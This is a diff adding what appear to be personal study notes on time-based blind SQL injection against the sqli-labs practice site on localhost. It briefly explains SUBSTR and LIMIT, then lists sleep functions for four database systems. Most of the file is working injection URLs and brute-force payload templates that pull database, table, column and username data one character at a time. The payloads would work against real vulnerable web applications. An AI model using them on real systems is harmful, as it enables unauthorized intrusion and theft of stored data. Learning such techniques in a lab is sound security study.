@@ -1,0 +1,113 @@
+--------------
+basic (substr)
+--------------
+
+SUBSTR(input_string, starting_position, length)
+
+SELECT SUBSTR('Hello, World!', 1, 2); -- Output: 'He'
+SELECT SUBSTR('Hello, World!', 3, 3); -- Output: 'llo'
+SELECT SUBSTR('Hello, World!', -4); -- Output: 'rld!'
+
+
+-------------
+basic (limit)
+-------------
+
+limit 0,1
+
+The 0 in the LIMIT clause represents the starting record, and the 1 represents the number of records to retrieve.(row/col)
+
+-------------
+
+Finding error
+-------------
+http://localhost/sqli/Less-9/?id=1' and (SELECT SLEEP(10)) --+
+
+
+Oracle	          dbms_pipe.receive_message(('a'),10)
+
+Microsoft	      WAITFOR DELAY '0:0:10'
+
+PostgreSQL	      SELECT pg_sleep(10)
+
+MySQL	          (SELECT SLEEP(10))
+
+
+Conditional time delays
+You can test a single boolean condition and trigger a time delay if the condition is true.
+
+Oracle			SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+Microsoft		IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+PostgreSQL		SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL			SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+
+
+--------------
+finding tables
+--------------
+http://localhost/sqli/Less-9/?id=1' AND (SELECT IF(substr(database(),1,1) = 's',SLEEP(10), 'a')) --+
+
+AND (SELECT 
+		IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 'e',
+		SLEEP(10), 
+		'a'
+		)
+		) --+
+
+http://localhost/sqli/Less-9/?id=1' AND (SELECT    IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 'e',   SLEEP(10),    'a'   )   ) --+
+
+http://localhost/sqli/Less-9/?id=1' AND (SELECT IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1) = 'm',SLEEP(10),'a')) --+
+
+http://localhost/sqli/Less-9/?id=1' AND (SELECT IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),payload1,1) = 'payload2',SLEEP(10),'a')) --+
+
+and we get email
+
+after that change (limit 0,1) to (limit 1,1) to get second table
+
+http://localhost/sqli/Less-9/?id=1' AND (SELECT IF(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1) = 'r',SLEEP(10),'a')) --+
+
+http://localhost/sqli/Less-9/?id=1' AND (SELECT IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1) = 'm',SLEEP(10),'a')) --+
+
+
+---------------
+finding columns
+---------------
+
+http://localhost/sqli/Less-10/?id=1" AND (SELECT IF(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),3,1)= 'e',SLEEP(10),'a')) --+
+
+AND (SELECT IF(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)= 'a',SLEEP(10),'a')) --+
+
+AND (SELECT 
+		IF(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)= 'a',
+		SLEEP(10),
+		'a'
+		)
+	) --+
+
+--------------
+retriving data
+--------------
+AND (SELECT IF(substr((select username from users limit 0,1),payloadnum,1)= 'payload2',SLEEP(10),'a'))
+
+http://localhost/sqli/Less-10/?id=1" AND (SELECT IF(substr((select username from users limit 0,1),4,1)= 'b',SLEEP(10),'a')) --+
+
+																--------
+																payloads
+																--------
+																
+
+--------------
+finding tables
+--------------
+AND (SELECT IF(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),number,1) = 'bruteforcer',SLEEP(10),'a')) --+
+
+---------------
+finding columns
+---------------
+AND (SELECT IF(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),number,1)= 'bruteforcer',SLEEP(10),'a')) --+
+
+--------------
+retriving data
+--------------
+
+AND (SELECT IF(substr((select username from users limit 0,1),number,1)= 'bruteforcer',SLEEP(10),'a')) --+
